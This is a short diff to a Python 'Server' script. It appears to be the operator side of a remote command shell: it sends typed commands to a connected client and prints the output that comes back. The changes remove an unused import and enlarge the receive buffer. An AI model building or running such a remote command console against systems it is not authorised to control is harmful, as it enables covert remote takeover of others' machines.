@@ -1,5 +1,5 @@
 # Server
-import socket,os,textwrap
+import socket,os
 from colorama import Fore
 
 os.system("cls")
@@ -35,7 +35,7 @@ while True:
             break
         if len(cmd) > 0:
             client.send(cmd.encode())
-            client_response = str(client.recv(1024),"utf-8")
+            client_response = str(client.recv(4096),"utf-8")
             print(client_response, end="")
     except Exception as e:
         print("Error running command: ",e)
